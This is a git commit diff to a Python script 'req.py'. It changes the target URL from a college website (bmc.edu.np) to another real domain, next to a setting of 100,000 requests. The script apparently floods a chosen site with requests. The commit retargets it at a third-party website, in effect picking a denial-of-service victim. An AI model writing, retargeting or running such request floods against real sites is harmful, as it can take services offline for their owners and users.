a61d4a65057aa868d7924ed8e93a4eaef15745e2
Ankit Shrestha <69841529+ankit848@users.noreply.github.com>
2024-04-22 16:31:30 +0545

    Update req.py

--- req.py
+++ req.py
@@ -59,7 +59,7 @@ def send_request(url):
 
 def main():
     # Define the URL
-    url = 'https://bmc.edu.np'
+    url = 'https://themallathens66.com'
     
     # Number of times to send the request
     num_requests = 100000
